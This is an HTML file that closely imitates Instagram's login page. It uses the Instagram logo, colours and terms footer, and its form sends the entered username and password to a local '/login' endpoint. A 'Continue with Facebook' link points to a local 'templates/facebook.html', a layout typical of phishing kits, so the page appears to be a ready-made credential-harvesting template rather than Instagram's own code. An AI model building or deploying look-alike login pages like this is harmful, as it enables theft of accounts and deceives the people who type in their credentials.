<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #fafafa;
            font-family: Arial, sans-serif;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .logo img {
            width: 150px;
            margin-bottom: 20px;
        }
        .login-container {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 10px;
            padding: 20px;
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        .btn-facebook {
            background-color: #1877f2;
            color: #fff;
            border: none;
            margin-bottom: 15px;
            width: 100%;
            padding: 10px;
            font-size: 14px;
            text-decoration: none;
            border-radius: 5px;
            display: inline-block;
        }
        .btn-facebook:hover {
            background-color: #145dbf;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider::before {
            margin-right: 10px;
        }
        .divider::after {
            margin-left: 10px;
        }
        .form-control {
            border-radius: 5px;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .btn-login {
            background-color: #0095f6;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 5px;
            width: 100%;
            font-size: 14px;
        }
        .btn-login:hover {
            background-color: #007dc1;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 10px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .signup {
            margin-top: 20px;
            font-size: 14px;
        }
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <div class="login-container">
            <a href="templates/facebook.html" class="btn-facebook">Continue with Facebook</a>
            <div class="divider">OR</div>
            <form method="POST" action="/login">
                <input type="text" class="form-control" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" class="form-control" name="password" placeholder="Password" required>
                <button type="submit" class="btn-login">Log In</button>
            </form>
            <a href="#" class="forgot-password">Forgot password?</a>
            <div class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
        <div class="footer">
            By continuing, you agree to Instagram's Terms of Use and Privacy Policy.
        </div>
    </div>
</body>
</html>
